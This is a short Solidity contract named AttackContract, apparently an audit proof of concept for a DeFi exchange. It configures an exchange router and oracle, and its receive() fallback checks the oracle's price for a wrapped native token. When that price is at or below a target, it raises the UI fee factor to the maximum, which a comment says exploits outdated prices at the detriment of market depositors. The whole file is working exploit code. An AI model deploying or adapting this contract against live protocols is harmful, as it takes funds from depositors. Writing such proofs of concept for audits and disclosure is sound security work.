// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "../price/Price.sol";

interface IExchangeRouter {
    function setUiFeeFactor(uint256 uiFeeFactor) external payable;
}

interface IOracle {
    function getLatestPrice(address token) external view returns (Price.Props memory);
}

contract AttackContract {

    IExchangeRouter exchangeRouter;
    IOracle oracle;
    address wnt;
    uint256 targetPrice;

    function configure(address _exchangeRouter, address _oracle, address _wnt, uint256 _targetPrice) external {
        exchangeRouter = IExchangeRouter(_exchangeRouter);
        oracle = IOracle(_oracle);
        wnt = _wnt;
        targetPrice = _targetPrice;
    }

    receive() external payable {
        Price.Props memory wntPrice = oracle.getLatestPrice(wnt);

        // Notice that the target price could also come from some oracle or DEX quote
        // This way outdated prices can be automatically taken advantage of at the detriment of
        // market depositors
        if (wntPrice.min > targetPrice) return;

        // Max uiFee 0.005% => 5 * 1e25
        exchangeRouter.setUiFeeFactor(5 * 1e25);
    }

}
